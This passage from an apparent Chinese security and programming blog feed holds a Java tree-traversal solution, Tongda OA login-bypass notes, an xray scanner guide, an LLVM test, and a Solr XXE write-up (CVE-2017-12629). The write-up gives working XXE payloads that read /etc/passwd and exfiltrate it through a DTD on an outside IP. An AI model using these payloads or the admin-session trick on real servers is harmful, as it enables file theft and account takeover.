class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        HashMap&lt;TreeNode,Integer&gt; levelMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        List&lt;Integer&gt; integers = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> lastLevel = -<span class="number">1</span>;</span><br><span class="line">        levelMap.put(root,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            TreeNode top = queue.poll();</span><br><span class="line">            <span class="keyword">int</span> level = levelMap.get(top);</span><br><span class="line">            <span class="keyword">if</span>(level != lastLevel)&#123;</span><br><span class="line">                integers = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">                integers.add(top.val);</span><br><span class="line">                res.add(integers);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                integers.add(top.val);</span><br><span class="line">            &#125;</span><br><span class="line">            lastLevel = level;</span><br><span class="line">            <span class="keyword">if</span>(top.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">                queue.add(top.left);</span><br><span class="line">                levelMap.put(top.left,level+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(top.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">                queue.add(top.right);</span><br><span class="line">                levelMap.put(top.right,level+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>效率并不高：<br><img src="/assets/image-20200619194659825.png" alt="image-20200619194659825"></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;102-二叉树的层序遍历&quot;&gt;&lt;a href=&quot;#102-二叉树的层序遍历&quot; class=&quot;headerlink&quot; title=&quot;102. 二叉树的层序遍历&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode-cn.com/problems/binary-tree-level-order-traversal/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;102. 二叉树的层序遍历&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;难度中等536&lt;/p&gt;
&lt;p&gt;给你一个二叉树，请你返回其按 &lt;strong&gt;层序遍历&lt;/strong&gt; 得到的节点值。 （即逐层地，从左到右访问所有节点）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例：&lt;/strong&gt;&lt;br&gt;二叉树：&lt;code&gt;[3,9,20,null,null,15,7]&lt;/code&gt;,&lt;/p&gt;
&lt;figure class=&quot;highlight angelscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; / \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;  &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  /  \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;number&quot;&gt;15&lt;/span&gt;   &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;返回其层次遍历结果：&lt;/p&gt;
&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  [&lt;span class=&quot;number&quot;&gt;15&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="编程" scheme="http://blog.ydq6.com/categories/program/"/>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>常用软件漏洞集合</title>
    <link href="http://blog.ydq6.com/uncategorized/%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/"/>
    <id>http://blog.ydq6.com/uncategorized/%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</id>
    <published>2020-06-17T10:17:19.000Z</published>
    <updated>2020-06-20T05:34:12.339Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="nginx漏洞">Nginx漏洞</span></h3><h3><span id="通达oa">通达OA</span></h3><h3><span id="任意用户登录漏洞">任意用户登录漏洞</span></h3><p>在logincheck_code.php中删除cookie并在post请求中加入UID=1，然后响应返回系统管理员session值。</p><h3><span id="另一处任意用户登录漏洞">另一处任意用户登录漏洞</span></h3><p>通过精心构造请求得到系统管理员的codeuid,然后再在login_code_check.php的get请求中带入codeuid参数得到系统管理员的session。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;nginx漏洞&quot;&gt;Nginx漏洞&lt;/span&gt;&lt;/h3&gt;&lt;h3&gt;&lt;span id=&quot;通达oa&quot;&gt;通达OA&lt;/span&gt;&lt;/h3&gt;&lt;h3&gt;&lt;span id=&quot;任意用户登录漏洞&quot;&gt;任意用户登录漏洞&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;在logincheck_cod
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>XRAY介绍</title>
    <link href="http://blog.ydq6.com/uncategorized/XRAY%E4%BB%8B%E7%BB%8D/"/>
    <id>http://blog.ydq6.com/uncategorized/XRAY%E4%BB%8B%E7%BB%8D/</id>
    <published>2020-06-17T03:54:45.531Z</published>
    <updated>2020-06-17T10:49:32.036Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="扫描">扫描</span></h1><p>扫描：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xray webscan <span class="comment">--basic-crawler url</span></span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xray_windows_386.exe webscan --basic-crawler <span class="string">http:</span><span class="comment">//testphp.vulnweb.com/</span></span><br></pre></td></tr></table></figure><h2><span id="被动代理">被动代理</span></h2><p>代理扮演中间人角色。</p><p>1.安装浏览器代理插件：SwitchyOmega插件</p><p>2.生成xray证书并安装证书</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="string">\xray_windows_386.exe</span> genca <span class="comment">#生成证书</span></span><br></pre></td></tr></table></figure><p>然后安装证书</p><p>3.启动代理</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">xray_windows_386</span><span class="selector-class">.exe</span> <span class="selector-tag">webscan</span> <span class="selector-tag">--listen</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:1111</span> <span class="selector-tag">--html-output</span> <span class="selector-tag">proxy</span><span class="selector-class">.html</span></span><br></pre></td></tr></table></figure><p>可以新建proxy.bat文件：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="配置文件">配置文件</span></h2><p>配置文件位置config.yaml（注意只有使用过一次xray才会生成配置文件）</p><h3><span id="允许扫描的域">允许扫描的域</span></h3><p>配置允许扫描和不允许扫描的域：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">includes</span></span><br><span class="line"><span class="attribute">excludes</span></span><br></pre></td></tr></table></figure><h3><span id="认证信息配置">认证信息配置</span></h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">auth</span></span><br></pre></td></tr></table></figure><h3><span id="扫描插件配置">扫描插件配置</span></h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugins中把需要开启的选项设置enabled为<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>或者使用 –plugins pulgin1,plugin2,…</p><h3><span id="发包速率限制">发包速率限制</span></h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">max_qps</span>              每秒最大请求次</span><br></pre></td></tr></table></figure><h3><span id="扫描代理配置">扫描代理配置</span></h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">proxy</span></span><br></pre></td></tr></table></figure><p>可以配置上游代理，比如流量分发。</p><p>burpsuite和xray可以互相转发。</p><h2><span id="编写自定义poc">编写自定义POC</span></h2><p>poc为yaml格式。</p><p>可以使用多个规则来串联。</p><p>poc的构成：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">- </span>name</span><br><span class="line"><span class="bullet">- </span>rules</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>detail:</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;扫描&quot;&gt;扫描&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;扫描：&lt;/p&gt;
&lt;figure class=&quot;highlight ada&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>solr漏洞研究</title>
    <link href="http://blog.ydq6.com/uncategorized/solr%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    <id>http://blog.ydq6.com/uncategorized/solr%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</id>
    <published>2020-06-10T15:05:52.000Z</published>
    <updated>2020-06-17T07:57:00.149Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要研究solr漏洞</p><h1><span id="apache-solr-xml-实体注入漏洞cve-2017-12629">Apache solr XML 实体注入漏洞（CVE-2017-12629）</span></h1><p>访问存在搭建好的漏洞网站：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">121.199</span>.<span class="number">53.175</span>:<span class="number">8983</span><span class="regexp">/solr/</span>demo<span class="regexp">/select</span></span><br></pre></td></tr></table></figure><p>抓包：</p><p><img src="/assets/image-20200611095414239.png" alt="image-20200611095414239"></p><p>构造payload(利用dnslog):</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/solr/demo/select?q=<span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://123.8pby62.ceye.io/"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure><p>payload编码后：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/demo/<span class="keyword">select</span>?q=<span class="symbol">%3</span>C<span class="symbol">%3</span>Fxml<span class="symbol">%20</span>version<span class="symbol">%3</span>D<span class="symbol">%221</span>.<span class="number">0</span><span class="symbol">%22</span><span class="symbol">%20</span>encoding<span class="symbol">%3</span>D<span class="symbol">%22</span>UTF<span class="number">-8</span><span class="symbol">%22</span><span class="symbol">%3</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!DOCTYPE</span><span class="symbol">%20</span>root<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!ENTITY</span><span class="symbol">%20</span><span class="symbol">%25</span><span class="symbol">%20</span>remote<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>http<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="number">123.8</span>pby<span class="number">62</span>.ceye.io<span class="symbol">%2</span>F<span class="symbol">%22</span><span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%25</span>remote<span class="symbol">%3</span>B<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>Croot<span class="symbol">%2</span>F<span class="symbol">%3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure><p>成功显示：</p><p><img src="/assets/image-20200611175358522.png" alt="image-20200611175358522"></p><p>尝试读文件：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/demo/<span class="keyword">select</span>?q=<span class="symbol">%3</span>C<span class="symbol">%3</span>Fxml<span class="symbol">%20</span>version<span class="symbol">%3</span>D<span class="symbol">%221</span>.<span class="number">0</span><span class="symbol">%22</span><span class="symbol">%20</span>encoding<span class="symbol">%3</span>D<span class="symbol">%22</span>UTF<span class="number">-8</span><span class="symbol">%22</span><span class="symbol">%3</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!DOCTYPE</span><span class="symbol">%20</span>root<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!ENTITY</span><span class="symbol">%20</span><span class="symbol">%25</span><span class="symbol">%20</span>remote<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>file<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="symbol">%2</span>Fetc<span class="symbol">%2</span>Fpasswd<span class="symbol">%22</span><span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%25</span>remote<span class="symbol">%3</span>B<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>Croot<span class="symbol">%2</span>F<span class="symbol">%3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200611180009274.png" alt="image-20200611180009274"></p><p>发现是无回显的XXE。</p><p>可以使用恶意DTD外带敏感文件。</p><p>恶意DTD:</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://104.243.21.153:8998/%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%all;</span></span><br></pre></td></tr></table></figure><p>攻击payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/solr/demo/select?q=<span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil5.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure><p>urlencode后：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/demo/select?q=%<span class="number">3</span>C%<span class="number">3</span>Fxml%<span class="number">20</span>version%<span class="number">3</span>D%<span class="number">221.0</span>%<span class="number">22</span>%<span class="number">20</span>encoding%<span class="number">3</span>D%<span class="number">22</span>UTF<span class="number">-8</span>%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>C!DOCTYPE%<span class="number">20</span>root%<span class="number">20</span>%<span class="number">5</span>B%<span class="number">0</span>A%<span class="number">3</span>C!ENTITY%<span class="number">20</span>%<span class="number">25</span>%<span class="number">20</span>remote%<span class="number">20</span>SYSTEM%<span class="number">20</span>%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F104<span class="number">.243</span><span class="number">.21</span><span class="number">.153</span>%<span class="number">2</span>Fxxe%<span class="number">2</span>Fevil5.dtd%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">25</span>remote%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">25</span>send%<span class="number">3</span>B%<span class="number">5</span>D%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>Croot%<span class="number">2</span>F%<span class="number">3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/solr/demo/select?q=<span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil5.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;root;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/demo/select?q=%<span class="number">3</span>C%<span class="number">3</span>Fxml%<span class="number">20</span>version%<span class="number">3</span>D%<span class="number">221.0</span>%<span class="number">22</span>%<span class="number">20</span>encoding%<span class="number">3</span>D%<span class="number">22</span>UTF<span class="number">-8</span>%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>C!DOCTYPE%<span class="number">20</span>root%<span class="number">20</span>%<span class="number">5</span>B%<span class="number">0</span>A%<span class="number">3</span>C!ENTITY%<span class="number">20</span>%<span class="number">25</span>%<span class="number">20</span>remote%<span class="number">20</span>SYSTEM%<span class="number">20</span>%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F104<span class="number">.243</span><span class="number">.21</span><span class="number">.153</span>%<span class="number">2</span>Fxxe%<span class="number">2</span>Fevil5.dtd%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">25</span>remote%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">25</span>send%<span class="number">3</span>B%<span class="number">5</span>D%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>Cuser%<span class="number">3</span>E%<span class="number">26</span>root%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fuser%<span class="number">3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文主要研究solr漏洞&lt;/p&gt;
&lt;h1&gt;&lt;span id=&quot;apache-solr-xml-实体注入漏洞cve-2017-12629&quot;&gt;Apache solr XML 实体注入漏洞（CVE-2017-12629）&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;访问存在搭建好的漏洞网站：&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>LLVM系列-多态测试</title>
    <link href="http://blog.ydq6.com/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/LLVM%E7%B3%BB%E5%88%97-%E5%A4%9A%E6%80%81%E6%B5%8B%E8%AF%95/"/>
    <id>http://blog.ydq6.com/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/LLVM%E7%B3%BB%E5%88%97-%E5%A4%9A%E6%80%81%E6%B5%8B%E8%AF%95/</id>
    <published>2020-06-08T12:44:49.000Z</published>
    <updated>2020-06-08T13:01:41.605Z</updated>
    
    <content type="html"><![CDATA[<p>此文主要探讨LLVM是如何处理多态的。</p><a id="more"></a><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by ydq on 6/8/20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a+b+c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  A a;</span><br><span class="line">  <span class="keyword">int</span> res1 = a.add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">int</span> res2 = a.add(<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;<span class="string">"res1:"</span>&lt;&lt;res1&lt;&lt;<span class="string">",res2:"</span>&lt;&lt;res2&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>llvm生成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -emit-llvm testclass.cpp -S -o testclass.ll</span><br></pre></td></tr></table></figure><p>生成代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span 